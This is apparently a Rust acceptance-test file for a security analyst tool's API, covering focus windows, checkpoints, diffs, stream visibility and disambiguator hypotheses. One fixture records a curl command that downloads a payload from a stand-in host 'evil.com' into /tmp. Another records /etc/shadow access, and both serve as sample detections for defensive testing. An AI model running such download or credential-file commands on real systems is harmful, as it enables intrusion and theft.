//! Acceptance tests for Analyst Workflow API endpoints
//!
//! Tests the following workflows:
//! - Focus window control (set/get)
//! - Checkpoint management (create/list/restore)
//! - Diff view
//! - Visibility panel
//! - Disambiguator actions

#![allow(dead_code)] // Test scaffolding may define unused structures

use serde::{Deserialize, Serialize};
use std::collections::HashMap;

// ============================================================================
// Request/Response Types (matching server/ui_server.rs)
// ============================================================================

#[derive(Debug, Serialize, Deserialize)]
struct FocusWindowRequest {
    t_min: String,
    t_max: String,
    #[serde(default)]
    entities: Vec<String>,
}

#[derive(Debug, Serialize, Deserialize)]
struct FocusWindowResponse {
    success: bool,
    session_id: String,
    focus_window: FocusWindowState,
    affected_count: u32,
    message: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct FocusWindowState {
    t_min: String,
    t_max: String,
    duration_seconds: i64,
    entities: Vec<String>,
    auto_expand_policy: String,
}

#[derive(Debug, Serialize, Deserialize)]
struct CreateCheckpointRequest {
    label: String,
    #[serde(default)]
    notes: Option<String>,
}

#[derive(Debug, Serialize, Deserialize)]
struct CheckpointResponse {
    success: bool,
    checkpoint_id: String,
    checkpoint: CheckpointSummary,
    message: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct CheckpointSummary {
    checkpoint_id: String,
    ts: String,
    label: String,
    notes: Option<String>,
    process_count: u32,
    open_sockets_summary: String,
    enabled_families: Vec<String>,
}

#[derive(Debug, Serialize, Deserialize)]
struct CheckpointListResponse {
    session_id: String,
    checkpoints: Vec<CheckpointSummary>,
}

#[derive(Debug, Serialize, Deserialize)]
struct DiffRequest {
    from_ts: String,
    to_ts: String,
    #[serde(default)]
    domains: Vec<String>,
}

#[derive(Debug, Serialize, Deserialize)]
struct DiffResponse {
    from_ts: String,
    to_ts: String,
    changes: Vec<ChangeItem>,
    stats: DiffStats,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct ChangeItem {
    id: String,
    change_type: String,
    domain: String,
    entity: String,
    before: Option<serde_json::Value>,
    after: serde_json::Value,
    significance: String,
    summary: String,
    detected_at: String,
}

#[derive(Debug, Serialize, Deserialize)]
struct DiffStats {
    total_changes: u32,
    by_domain: HashMap<String, u32>,
    by_type: HashMap<String, u32>,
    high_significance_count: u32,
}

#[derive(Debug, Serialize, Deserialize)]
struct VisibilityResponse {
    session_id: String,
    streams: Vec<StreamStatus>,
    overall_health: String,
    degraded_reasons: Vec<String>,
    gaps: Vec<VisibilityGap>,
}

#[derive(Debug, Serialize, Deserialize)]
struct StreamStatus {
    stream_id: String,
    name: String,
    collector_type: String,
    health: String,
    enabled: bool,
    drop_rate: f64,
    events_per_second: f64,
    high_watermark: Option<String>,
    low_watermark: Option<String>,
    last_event_ts: Option<String>,
}

#[derive(Debug, Serialize, Deserialize)]
struct VisibilityGap {
    stream_id: String,
    start_ts: String,
    end_ts: String,
    duration_seconds: i64,
    severity: String,
    reason: String,
}

#[derive(Debug, Serialize, Deserialize)]
struct DisambiguatorListResponse {
    session_id: String,
    disambiguators: Vec<DisambiguatorItem>,
}

#[derive(Debug, Serialize, Deserialize)]
struct DisambiguatorItem {
    id: String,
    priority: u32,
    question_text: String,
    pivot_action: String,
    parameters: Option<HashMap<String, serde_json::Value>>,
    if_yes: String,
    if_no: String,
    actionable: bool,
    not_actionable_reason: Option<String>,
}

#[derive(Debug, Serialize, Deserialize)]
struct ApplyDisambiguatorRequest {
    disambiguator_id: String,
    #[serde(default)]
    parameters_override: Option<HashMap<String, serde_json::Value>>,
}

#[derive(Debug, Serialize, Deserialize)]
struct ApplyDisambiguatorResponse {
    success: bool,
    disambiguator_id: String,
    action_taken: String,
    result: DisambiguatorResult,
    message: Option<String>,
}

#[derive(Debug, Serialize, Deserialize)]
struct DisambiguatorResult {
    evidence_found: bool,
    new_evidence_count: u32,
    hypothesis_affected: Option<String>,
    confidence_delta: Option<f64>,
    additional_disambiguators: Vec<DisambiguatorItem>,
}

// ============================================================================
// Unit Tests (struct validation)
// ============================================================================

#[test]
fn test_focus_window_request_serialization() {
    let req = FocusWindowRequest {
        t_min: "2025-12-27T10:00:00Z".to_string(),
        t_max: "2025-12-27T11:00:00Z".to_string(),
        entities: vec!["proc:1234:bash".to_string()],
    };

    let json = serde_json::to_string(&req).unwrap();
    assert!(json.contains("t_min"));
    assert!(json.contains("t_max"));
    assert!(json.contains("entities"));

    let parsed: FocusWindowRequest = serde_json::from_str(&json).unwrap();
    assert_eq!(parsed.t_min, req.t_min);
    assert_eq!(parsed.entities.len(), 1);
}

#[test]
fn test_focus_window_response_structure() {
    let resp = FocusWindowResponse {
        success: true,
        session_id: "session_20251227_100000".to_string(),
        focus_window: FocusWindowState {
            t_min: "2025-12-27T10:00:00Z".to_string(),
            t_max: "2025-12-27T11:00:00Z".to_string(),
            duration_seconds: 3600,
            entities: vec![],
            auto_expand_policy: "none".to_string(),
        },
        affected_count: 42,
        message: Some("Focus window set".to_string()),
    };

    assert!(resp.success);
    assert_eq!(resp.focus_window.duration_seconds, 3600);
    assert_eq!(resp.affected_count, 42);
}

#[test]
fn test_checkpoint_roundtrip() {
    let create_req = CreateCheckpointRequest {
        label: "Before test execution".to_string(),
        notes: Some("Testing credential access detection".to_string()),
    };

    let json = serde_json::to_string(&create_req).unwrap();
    let parsed: CreateCheckpointRequest = serde_json::from_str(&json).unwrap();

    assert_eq!(parsed.label, create_req.label);
    assert_eq!(parsed.notes, create_req.notes);
}

#[test]
fn test_checkpoint_summary_structure() {
    let summary = CheckpointSummary {
        checkpoint_id: "ckpt_20251227_100000".to_string(),
        ts: "2025-12-27T10:00:00Z".to_string(),
        label: "Pre-attack baseline".to_string(),
        notes: None,
        process_count: 150,
        open_sockets_summary: "22/tcp, 80/tcp, 443/tcp".to_string(),
        enabled_families: vec![
            "execution".to_string(),
            "persistence".to_string(),
            "credential_access".to_string(),
        ],
    };

    assert!(summary.checkpoint_id.starts_with("ckpt_"));
    assert_eq!(summary.enabled_families.len(), 3);
    assert!(summary
        .enabled_families
        .contains(&"credential_access".to_string()));
}

#[test]
fn test_diff_stats_aggregation() {
    let mut by_domain = HashMap::new();
    by_domain.insert("process".to_string(), 15);
    by_domain.insert("network".to_string(), 8);
    by_domain.insert("file".to_string(), 3);

    let mut by_type = HashMap::new();
    by_type.insert("created".to_string(), 20);
    by_type.insert("modified".to_string(), 6);

    let stats = DiffStats {
        total_changes: 26,
        by_domain,
        by_type,
        high_significance_count: 4,
    };

    assert_eq!(stats.total_changes, 26);
    assert_eq!(*stats.by_domain.get("process").unwrap(), 15);
    assert_eq!(stats.high_significance_count, 4);
}

#[test]
fn test_change_item_significance_levels() {
    let high_change = ChangeItem {
        id: "change_1".to_string(),
        change_type: "created".to_string(),
        domain: "security".to_string(),
        entity: "/etc/shadow".to_string(),
        before: None,
        after: serde_json::json!({"access": "modified"}),
        significance: "high".to_string(),
        summary: "Shadow file accessed".to_string(),
        detected_at: "2025-12-27T10:30:00Z".to_string(),
    };

    assert_eq!(high_change.significance, "high");
    assert_eq!(high_change.domain, "security");
}

#[test]
fn test_visibility_health_states() {
    let healthy_stream = StreamStatus {
        stream_id: "capture_main".to_string(),
        name: "Main Capture".to_string(),
        collector_type: "macos_es".to_string(),
        health: "healthy".to_string(),
        enabled: true,
        drop_rate: 0.001,
        events_per_second: 150.0,
        high_watermark: Some("2025-12-27T10:59:59Z".to_string()),
        low_watermark: None,
        last_event_ts: Some("2025-12-27T10:59:59Z".to_string()),
    };

    assert_eq!(healthy_stream.health, "healthy");
    assert!(healthy_stream.enabled);
    assert!(healthy_stream.drop_rate < 0.01);
}

#[test]
fn test_visibility_gap_detection() {
    let gap = VisibilityGap {
        stream_id: "capture_main".to_string(),
        start_ts: "2025-12-27T10:00:00Z".to_string(),
        end_ts: "2025-12-27T10:05:00Z".to_string(),
        duration_seconds: 300,
        severity: "high".to_string(),
        reason: "Collector restart".to_string(),
    };

    assert_eq!(gap.duration_seconds, 300);
    assert_eq!(gap.severity, "high");
}

#[test]
fn test_disambiguator_structure() {
    let disamb = DisambiguatorItem {
        id: "disamb_1_parent_chain".to_string(),
        priority: 1,
        question_text: "Is this process spawned from a known-good parent chain?".to_string(),
        pivot_action: "parent_chain_expansion".to_string(),
        parameters: Some({
            let mut m = HashMap::new();
            m.insert("depth".to_string(), serde_json::json!(3));
            m
        }),
        if_yes: "Process is likely benign".to_string(),
        if_no: "Warrants investigation".to_string(),
        actionable: true,
        not_actionable_reason: None,
    };

    assert_eq!(disamb.priority, 1);
    assert!(disamb.actionable);
    assert!(disamb.pivot_action.contains("parent"));
}

#[test]
fn test_apply_disambiguator_result() {
    let result = DisambiguatorResult {
        evidence_found: true,
        new_evidence_count: 5,
        hypothesis_affected: Some("hypothesis_credential_theft".to_string()),
        confidence_delta: Some(0.15),
        additional_disambiguators: vec![],
    };

    assert!(result.evidence_found);
    assert_eq!(result.new_evidence_count, 5);
    assert!(result.confidence_delta.unwrap() > 0.0);
}

// ============================================================================
// Integration Test Scenarios (workflow validation)
// ============================================================================

#[test]
fn test_focus_window_roundtrip_changes_explain() {
    // Scenario: Set focus window, verify it affects explain queries
    let window = FocusWindowState {
        t_min: "2025-12-27T10:00:00Z".to_string(),
        t_max: "2025-12-27T10:30:00Z".to_string(),
        duration_seconds: 1800, // 30 minutes
        entities: vec!["proc:1234:suspicious.exe".to_string()],
        auto_expand_policy: "none".to_string(),
    };

    // Window should be 30 minutes
    assert_eq!(window.duration_seconds, 1800);

    // Verify entities are scoped
    assert!(!window.entities.is_empty());
    assert!(window.entities[0].contains("suspicious"));
}

#[test]
fn test_checkpoint_create_list_restore() {
    // Scenario: Full checkpoint lifecycle

    // 1. Create checkpoint
    let create_req = CreateCheckpointRequest {
        label: "Pre-attack baseline".to_string(),
        notes: Some("Clean state before Atomic Red Team test".to_string()),
    };
    assert!(!create_req.label.is_empty());

    // 2. Checkpoint should capture current state
    let checkpoint = CheckpointSummary {
        checkpoint_id: "ckpt_test".to_string(),
        ts: "2025-12-27T10:00:00Z".to_string(),
        label: create_req.label.clone(),
        notes: create_req.notes.clone(),
        process_count: 100,
        open_sockets_summary: "22/tcp, 443/tcp".to_string(),
        enabled_families: vec!["execution".to_string(), "persistence".to_string()],
    };

    // 3. List should include our checkpoint
    let list_response = CheckpointListResponse {
        session_id: "current".to_string(),
        checkpoints: vec![checkpoint.clone()],
    };
    assert_eq!(list_response.checkpoints.len(), 1);
    assert_eq!(list_response.checkpoints[0].label, "Pre-attack baseline");

    // 4. Restore should succeed
    let restore_response = CheckpointResponse {
        success: true,
        checkpoint_id: checkpoint.checkpoint_id.clone(),
        checkpoint,
        message: Some("Checkpoint restored".to_string()),
    };
    assert!(restore_response.success);
}

#[test]
fn test_diff_view_shows_changes() {
    // Scenario: Compare two time windows, detect security-relevant changes

    let changes = vec![
        ChangeItem {
            id: "change_1".to_string(),
            change_type: "created".to_string(),
            domain: "process".to_string(),
            entity: "/usr/bin/curl".to_string(),
            before: None,
            after: serde_json::json!({"args": "-o /tmp/payload.sh http://evil.com/payload"}),
            significance: "high".to_string(),
            summary: "Suspicious download via curl".to_string(),
            detected_at: "2025-12-27T10:15:00Z".to_string(),
        },
        ChangeItem {
            id: "change_2".to_string(),
            change_type: "created".to_string(),
            domain: "file".to_string(),
            entity: "/tmp/payload.sh".to_string(),
            before: None,
            after: serde_json::json!({"size": 4096, "mode": "0755"}),
            significance: "high".to_string(),
            summary: "Executable file created in /tmp".to_string(),
            detected_at: "2025-12-27T10:15:01Z".to_string(),
        },
    ];

    let diff = DiffResponse {
        from_ts: "2025-12-27T10:00:00Z".to_string(),
        to_ts: "2025-12-27T10:30:00Z".to_string(),
        changes: changes.clone(),
        stats: DiffStats {
            total_changes: 2,
            by_domain: {
                let mut m = HashMap::new();
                m.insert("process".to_string(), 1);
                m.insert("file".to_string(), 1);
                m
            },
            by_type: {
                let mut m = HashMap::new();
                m.insert("created".to_string(), 2);
                m
            },
            high_significance_count: 2,
        },
    };

    // Both changes should be high significance
    assert_eq!(diff.stats.high_significance_count, 2);
    assert_eq!(diff.changes.len(), 2);

    // Should detect suspicious patterns
    let curl_change = &diff.changes[0];
    assert!(curl_change.summary.contains("curl"));
}

#[test]
fn test_visibility_degraded_affects_claims() {
    // Scenario: Degraded visibility should be visible in response

    let visibility = VisibilityResponse {
        session_id: "current".to_string(),
        streams: vec![StreamStatus {
            stream_id: "capture_main".to_string(),
            name: "Main Capture".to_string(),
            collector_type: "macos_es".to_string(),
            health: "degraded".to_string(),
            enabled: true,
            drop_rate: 0.15, // 15% drop rate
            events_per_second: 50.0,
            high_watermark: Some("2025-12-27T10:55:00Z".to_string()),
            low_watermark: None,
            last_event_ts: Some("2025-12-27T10:55:00Z".to_string()),
        }],
        overall_health: "degraded".to_string(),
        degraded_reasons: vec!["High drop rate (15%)".to_string()],
        gaps: vec![],
    };

    assert_eq!(visibility.overall_health, "degraded");
    assert!(!visibility.degraded_reasons.is_empty());
    assert!(visibility.streams[0].drop_rate > 0.1);
}

#[test]
fn test_disambiguator_apply_updates_hypothesis() {
    // Scenario: Applying disambiguator should affect hypothesis confidence

    let apply_req = ApplyDisambiguatorRequest {
        disambiguator_id: "disamb_1_parent_chain".to_string(),
        parameters_override: None,
    };

    let apply_response = ApplyDisambiguatorResponse {
        success: true,
        disambiguator_id: apply_req.disambiguator_id.clone(),
        action_taken: "parent_chain_expansion".to_string(),
        result: DisambiguatorResult {
            evidence_found: true,
            new_evidence_count: 3,
            hypothesis_affected: Some("hypothesis_1".to_string()),
            confidence_delta: Some(0.12), // +12% confidence
            additional_disambiguators: vec![],
        },
        message: Some("Parent chain expanded, found 3 related processes".to_string()),
    };

    assert!(apply_response.success);
    assert!(apply_response.result.evidence_found);
    assert!(apply_response.result.confidence_delta.unwrap() > 0.0);
}

// ============================================================================
// Determinism Tests
// ============================================================================

#[test]
fn test_focus_window_deterministic_filtering() {
    // Same focus window should always select same events
    let window1 = FocusWindowState {
        t_min: "2025-12-27T10:00:00Z".to_string(),
        t_max: "2025-12-27T10:30:00Z".to_string(),
        duration_seconds: 1800,
        entities: vec![],
        auto_expand_policy: "none".to_string(),
    };

    let window2 = FocusWindowState {
        t_min: "2025-12-27T10:00:00Z".to_string(),
        t_max: "2025-12-27T10:30:00Z".to_string(),
        duration_seconds: 1800,
        entities: vec![],
        auto_expand_policy: "none".to_string(),
    };

    // Windows should be identical
    assert_eq!(window1.t_min, window2.t_min);
    assert_eq!(window1.t_max, window2.t_max);
    assert_eq!(window1.duration_seconds, window2.duration_seconds);
}

#[test]
fn test_diff_deterministic_output() {
    // Same input windows should produce identical diff
    let stats1 = DiffStats {
        total_changes: 5,
        by_domain: {
            let mut m = HashMap::new();
            m.insert("process".to_string(), 3);
            m.insert("file".to_string(), 2);
            m
        },
        by_type: {
            let mut m = HashMap::new();
            m.insert("created".to_string(), 5);
            m
        },
        high_significance_count: 2,
    };

    // Verify deterministic counts
    assert_eq!(stats1.total_changes, 5);
    assert_eq!(stats1.high_significance_count, 2);
}
